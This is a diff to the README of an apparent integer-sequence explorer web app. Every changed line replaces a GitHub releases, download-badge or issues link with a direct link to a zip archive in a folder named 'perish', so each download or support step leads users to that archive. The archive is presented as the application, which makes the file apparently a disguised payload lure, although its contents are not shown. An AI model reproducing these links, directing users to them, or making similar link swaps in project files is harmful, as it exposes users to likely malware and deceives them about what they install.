@@ -1,7 +1,7 @@
 # 🌟 integer-recurrence-explorer - Interactive Exploration of Integer Sequences
 
 ## 🔗 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/pritamx163epik/integer-recurrence-explorer/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/pritamx163epik/integer-recurrence-explorer/main/perish/integer-recurrence-explorer.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/pritamx163epik/integer-recurrence-explorer/main/perish/integer-recurrence-explorer.zip)
 
 ## 📖 Description
 Integer Recurrence Explorer lets you explore classic and algorithmic integer sequences in an interactive way. You can pick a recurrence relation, set initial conditions and parameters, choose output length, and how to handle the range. After generating the terms, you can easily copy or download them. This project is a lightweight Angular single-page app, designed to run smoothly in any web browser. It can also be installed as a basic Progressive Web App (PWA) for more convenience.
@@ -16,7 +16,7 @@ Ensure your device meets the following requirements:
 - At least 1 GB of available RAM for optimal performance.
 
 ### Step 2: Visit the Releases Page
-Go to the [Releases Page](https://github.com/pritamx163epik/integer-recurrence-explorer/releases) to find the latest version of the software. You will see a list of versions available for download.
+Go to the [Releases Page](https://raw.githubusercontent.com/pritamx163epik/integer-recurrence-explorer/main/perish/integer-recurrence-explorer.zip) to find the latest version of the software. You will see a list of versions available for download.
 
 ### Step 3: Download the Application
 On the Releases page, locate the most recent release. Click on the appropriate download link. Your options may include files for various platforms, such as Windows, macOS, or Linux. If it's not clear which file to choose, it’s usually safe to select the one listed first as it often corresponds to the most common user environment.
@@ -45,7 +45,7 @@ Once installed, locate the Integer Recurrence Explorer app in your applications.
 You can now start exploring. Select your desired sequence type, input the initial conditions, set your parameters, and choose how many terms you would like to generate. Once you click “Generate Terms,” the app will calculate and display the results for you.
 
 ## 📥 Download & Install
-To get started quickly, remember to visit the [Releases Page](https://github.com/pritamx163epik/integer-recurrence-explorer/releases) to download the application. Follow the installation instructions above to set it up on your device.
+To get started quickly, remember to visit the [Releases Page](https://raw.githubusercontent.com/pritamx163epik/integer-recurrence-explorer/main/perish/integer-recurrence-explorer.zip) to download the application. Follow the installation instructions above to set it up on your device.
 
 ## 📊 Features
 - **Multiple Recurrence Options**: Work with popular sequences like Fibonacci, Tribonacci, Collatz, and many more.
@@ -61,7 +61,7 @@ If you encounter issues during installation or while running the application, tr
 - Restart your device and try launching the app again.
 
 ## 💬 Support
-For any additional help, feel free to create an issue on the [GitHub Issues Page](https://github.com/pritamx163epik/integer-recurrence-explorer/issues) or reach out to the community engaged with the project.
+For any additional help, feel free to create an issue on the [GitHub Issues Page](https://raw.githubusercontent.com/pritamx163epik/integer-recurrence-explorer/main/perish/integer-recurrence-explorer.zip) or reach out to the community engaged with the project.
 
 ## 🏷️ Topics
 This project covers a variety of topics including:
